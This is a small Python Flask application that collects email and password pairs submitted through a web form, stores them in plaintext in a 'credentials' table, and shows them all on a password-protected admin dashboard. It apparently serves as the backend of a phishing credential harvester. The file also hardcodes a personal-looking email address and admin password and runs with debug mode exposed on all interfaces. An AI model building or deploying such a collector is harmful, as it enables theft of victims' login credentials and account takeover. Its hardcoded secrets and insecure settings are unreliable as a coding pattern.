from flask import Flask, render_template, request, redirect, session, url_for
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "replace_this_with_a_random_secret_key"

# Admin login (your dashboard access)
ADMIN_EMAIL = "aibelshibin7@gmail.com"
ADMIN_PASSWORD = "123456goodd"

# Database setup
DB_NAME = "database.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL
        )
    """)
    conn.commit()
    conn.close()

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("email")
    password = request.form.get("password")

    if not email or not password:
        return "Missing fields"

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO credentials (email, password) VALUES (?, ?)", (email, password))
    conn.commit()
    conn.close()

    return "Saved successfully"

@app.route("/admin-login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        if email == ADMIN_EMAIL and password == ADMIN_PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return "Wrong credentials"

    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("admin_login"))

    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT * FROM credentials ORDER BY id DESC")
    data = c.fetchall()
    conn.close()

    return render_template("dashboard.html", items=data)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("home"))

if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)